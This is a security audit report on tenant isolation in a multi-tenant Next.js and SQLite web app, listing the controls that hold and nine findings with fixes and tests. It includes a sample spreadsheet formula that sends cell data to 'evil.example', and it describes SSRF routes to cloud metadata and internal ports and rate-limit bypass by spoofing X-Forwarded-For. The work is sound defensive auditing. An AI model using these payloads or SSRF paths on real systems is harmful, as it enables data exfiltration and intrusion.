# Tenant isolation & security readiness assessment

Date: 2026-10-22. Commit audited: `08184c8` (main). Method: read-only code review of
`web/` plus additive unit tests (`web/test/isolation-*.test.ts`). No production
systems were probed; nothing here is verified against the live deployment.

Scope: does one tenant's data, credentials, or activity stay isolated from other
tenants, and what blocks the "thousands of concurrent tenants" goal on the
security/isolation axis.

## Architecture summary

One Next.js process, one SQLite file. Every tenant-owned table carries
`user_id` / `tenant_id`; API routes resolve the caller via
`requireUser()` (cookie session, SHA-256-hashed token in the `sessions` table)
and pass `user.id` down to store functions that filter in SQL.

## Verified isolation controls (what already holds)

Reviewed every API route and the store layer behind it. These are confirmed in
code and pinned by the new isolation tests:

- **Authentication**: scrypt password hashing, timing-safe comparison with a
  dummy salt for unknown emails, per-IP and per-account sign-in rate limits.
  Session tokens are 256-bit random, stored only as SHA-256 digests, cookie is
  `httpOnly; secure; sameSite=lax` (`app/api/auth/signin|signup`, `lib/auth-db.ts`).
- **Google sign-in**: PKCE + one-time state + nonce, ID token verified against
  Google's JWKS, `email_verified === true` required, and a Google identity is
  never linked to an existing password account (blocks account-takeover via
  unverified email signup) (`lib/auth-google.ts`).
- **Route authZ**: every API route calls `requireUser()` except the intended
  public ones, which authenticate by secret instead: cron tick
  (`AUTOPILOT_TICK_SECRET`, timing-safe compare), Stripe webhook (signature),
  Cal.com webhook (per-tenant HMAC), unsubscribe (HMAC token, acts on the
  message's own tenant only), health (no data).
- **Tenant scoping in SQL**: ID-addressed resources are fetched
  `WHERE id = ? AND tenant_id/user_id = ?` (leads via `scan_jobs` join,
  outreach messages, sequences, monitors, watches, CSV/commenter batches,
  reply threads, warm paths, newsjacks, CRM config). Routes also validate ID
  format (`/^[a-f0-9]{24}$/`) and return the same 404 for "missing" and
  "someone else's" - no existence oracle.
- **Secret isolation**: tenant LLM keys, connector credentials, CRM keys and
  Gmail refresh tokens are envelope-encrypted (AES-256-GCM, random data key per
  secret) with the tenant+vendor context bound as GCM additional data. A
  ciphertext copied into another tenant's row does not decrypt. Status
  endpoints return vendor + last4 only (`lib/secrets.ts`, `lib/llm/key-store.ts`,
  `lib/connectors/store.ts`, `lib/gmail/oauth.ts`).
- **SSRF guards on the main fetch paths**: the evidence checker
  (`lib/scan/fetch-page.ts`) and the user-site fetcher
  (`lib/net/public-fetch.ts`) reject non-public IPs (loopback, RFC1918,
  link-local/cloud-metadata, CGNAT, reserved), pin the validated address at
  connect time (no DNS-rebinding window), re-validate every redirect hop, and
  cap size/time.
- **Outbound email safety**: approval hash re-checked after async token
  refresh, suppression re-checked immediately before send, per-tenant daily
  caps, one-click unsubscribe via HMAC token honored immediately
  (`lib/outreach/service.ts`).
- **CSRF**: `sameSite=lax` plus `sameOriginJson` on mutating routes
  (`lib/same-origin.ts`).
- **Schema invariants**: CHECK constraints and triggers
  (`scan_jobs_transitions`, `leads_only_while_running`) hold even for writers
  that bypass the web app (external workers).

## Findings

Severity is judged for a multi-tenant production service. "Demonstrated" means
the code path is readable in the audit; "hypothetical" means exploitability
depends on deployment facts we could not verify from code.

### F1 - Medium (demonstrated): CSV formula injection in leads export

`web/lib/scan/csv.ts` `cell()` escapes quotes/commas/newlines but not cells
whose first character is `=`, `+`, `-`, `@` (or tab/CR). Lead fields
(`company`, `name`, `signal`, `evidence_excerpt`, `source_url`) come from
scraped third-party pages and LLM output - attacker-influenceable content. A
planted value like `=HYPERLINK("https://evil.example/?d="&A1,"x")` executes
when a tenant opens the export in Excel/Sheets, leaking row data; older Excel
allows DDE command execution.
Proposed fix: prefix a leading `=`, `+`, `-`, `@`, tab or CR with `'`.
Proposed test: `toCsv([[{ company: '=2+2' }]])` first data char is `'`.

### F2 - Medium (demonstrated): global rate-limit bucket on enrichment settings

`app/api/settings/enrichment/route.ts` POST rate-limits with the literal key
`'settings:enrichment'` (20/min) **before** `requireUser()`. The bucket is
shared by every tenant and by unauthenticated traffic: anyone can exhaust it
and block all tenants from saving or disconnecting Apollo/PDL keys. Every
other authenticated limiter keys on `user.id` or client IP.
Proposed fix: move `requireUser()` first and key the limiter on `user.id`.
Proposed test: 20 POSTs from tenant A do not 429 tenant B.

### F3 - Medium (hypothetical, config-dependent): X-Forwarded-For trusted blindly

`lib/rate-limit.ts` `clientIp()` takes the first `X-Forwarded-For` value
verbatim. If the edge (Caddy) does not overwrite XFF, an attacker rotates
spoofed IPs to bypass every IP-keyed limit: sign-in (20/15min), signup (5/hr),
unsubscribe (30/hr) and - most valuable - the trial `ip_throttle`, enabling
free-scan farming on the shared operator key.
Proposed fix: verify Caddy sets/strips XFF; otherwise trust only the
proxy-appended hop. Cannot be closed from this repo alone - flag for the
deploy owner.

### F4 - Medium (demonstrated): SEO audit and newsjack fetch without SSRF guards

Two fetch paths bypass the guarded fetchers:
- `lib/seo/audit.ts` `get()` - plain `fetch` with `redirect: 'follow'`, no IP
  filtering or pinning. `normalizeDomain()` even accepts `localhost`
  explicitly. The parsed title/description/H1/canonical/robots content is
  returned to the tenant, so a tenant-controlled domain resolving (or
  redirecting) to an internal address becomes a read primitive against
  anything the box can reach over HTTP(S) (cloud metadata if IMDSv1 is on,
  the session worker on :8787, the app itself).
- `lib/seo/newsjack.ts` `fetchArticle()` - any tenant-supplied `https://` URL,
  plain `fetch`, redirects followed, no IP guard; the page title is stored and
  returned and the excerpt feeds the LLM draft.
Proposed fix: route both through `lib/net/public-fetch.ts` (or the same
pinned-lookup guard), and drop `localhost` from `normalizeDomain`.
Proposed tests: `normalizeDomain('localhost')` returns null; audit of a domain
resolving to 169.254.169.254 returns `not_public` (using the existing
lookup-injection seam in public-fetch).

### F5 - Low (demonstrated): CRM webhook URL is a blind SSRF sink

`app/api/crm/route.ts` accepts any `https://` webhook URL
(`/^https:\/\/\S{4,400}$/`); `lib/crm/index.ts` POSTs lead data to it with no
IP guard. A tenant can make the server POST to internal HTTPS endpoints
(e.g. `https://localhost:8787/...`). Responses are not returned, so this is a
blind SSRF - still worth pinning with the public-fetch guard.
Proposed fix: validate the webhook host with `resolvePublic` before saving.

### F6 - Low (demonstrated): no session hygiene at scale

Expired sessions are never reaped (only per-token delete on signout), there is
no "sign out everywhere", and password change does not invalidate existing
sessions. 30-day tokens plus unbounded table growth.
Proposed fix: periodic `DELETE FROM sessions WHERE expires_at < unixepoch()`;
invalidate user sessions on password change (password change flow does not
exist yet).

### F7 - Low (known limitation, scale-blocking): in-memory rate limiter

`lib/rate-limit.ts` is a per-process Map. Under the planned multi-process /
stateless web tier (W3), every limit multiplies by process count - sign-in
protection, send caps and scan caps all weaken silently. The code comment
already says this; it becomes a real isolation gap the moment a second process
runs. Rate limits need a shared store (Postgres after W1, or Redis).

### F8 - Info: single shared process couples tenant fates

All tenants share one Node process and one SQLite writer. A pathological
tenant workload (huge CSV batch, heavy export) serializes writes for everyone;
synchronous better-sqlite3 blocks the event loop during any heavy query. The
runner claims jobs strictly FIFO across tenants. Not a vulnerability, but
"noisy neighbor" isolation does not exist yet - this is the W1/W2 work, noted
here so the security doc and the scaling plan agree.

### F9 - Info: trial scans concentrate cost on one shared key

Keyless accounts' trial scans (`funded_by = 'trial'`) all run on the shared
operator key. Combined with F3 (IP-throttle bypass), trial farming at scale
would burn operator quota and could starve paying tenants' provider calls.
Needs provider-side rate limits plus F3's fix.

## What was not verified

- Live deployment: Caddy/proxy header handling (F3), env secrets, IMDS
  version on the EC2 box, TLS termination. Out of scope (no production probing).
- The session worker on :8787 and the Hermes worker API - separate processes,
  not in this repo's `web/` tree; their auth is unreviewed here.
- Third-party data handling in the scan pipeline beyond what the store layer
  shows (prompt-injection handling in LLM calls is documented as "content is
  data" in code comments but not formally tested).

## New tests added by this assessment

- `web/test/isolation-tenant-scope.test.ts` - pins cross-tenant scoping for
  scan jobs/leads/exports, outreach drafts/approval, unsubscribe tokens,
  suppression lists, monitors, and the LLM key store.
- `web/test/isolation-secrets-binding.test.ts` - pins that a ciphertext
  transplanted to another tenant's row is unreadable (GCM AAD binding) for LLM
  keys and connector credentials.

Both are additive and pass on `08184c8`. Findings F1-F5 each name a regression
test for the PR that fixes them; those tests belong with their fixes.
